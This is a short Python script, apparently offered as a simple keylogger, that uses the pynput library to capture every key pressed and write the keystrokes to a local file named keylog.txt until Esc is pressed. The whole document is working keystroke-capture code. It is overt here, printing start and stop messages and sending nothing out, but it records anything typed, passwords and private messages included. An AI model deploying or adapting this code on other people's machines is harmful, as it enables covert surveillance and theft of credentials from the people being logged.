
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"
keys_list = []

def on_press(key):
    global keys_list
    try:
        keys_list.append(key.char)
    except AttributeError:
        keys_list.append(f'[{key}]')
    write_to_file()

def on_release(key):
    if key == Key.esc:
        return False

def write_to_file():
    with open(log_file, "w") as f:
        for key in keys_list:
            f.write(str(key))

def main():
    print("Simple Keylogger started. Press 'esc' to stop logging.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print(f"Keylogger stopped. Keystrokes saved to {log_file}")

if __name__ == "__main__":
    main()
